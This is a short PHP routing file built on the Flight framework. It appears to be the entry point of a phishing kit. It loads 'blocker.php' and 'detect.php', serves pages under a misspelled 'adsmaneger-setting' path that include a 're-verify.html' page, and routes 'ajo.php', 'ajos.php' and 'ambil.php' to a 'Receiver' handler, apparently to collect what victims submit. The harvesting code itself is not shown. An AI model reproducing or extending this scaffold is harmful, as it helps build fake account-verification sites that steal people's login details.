<?php
require 'vendor/autoload.php';
include('blocker.php');
include('detect.php');
Flight::route('/', array('WebController', 'indexUtama'));

Flight::route('/update', array('WebController', 'homepage'));
Flight::route('/adsmaneger-setting', array('WebController', 'index'));
Flight::route('/adsmaneger-setting/feloz.html', array('WebController', 'feloz'));
Flight::route('/adsmaneger-setting/homes.html', array('WebController', 'homes'));
Flight::route('/adsmaneger-setting/index.html', array('WebController', 'index'));
Flight::route('/adsmaneger-setting/re-verify.html', array('WebController', 'reVerify'));

Flight::route('/ajo.php', array('Receiver', 'ajo'));
Flight::route('/ajos.php', array('Receiver', 'ajos'));
Flight::route('/ambil.php', array('Receiver', 'ambil'));



Flight::start();
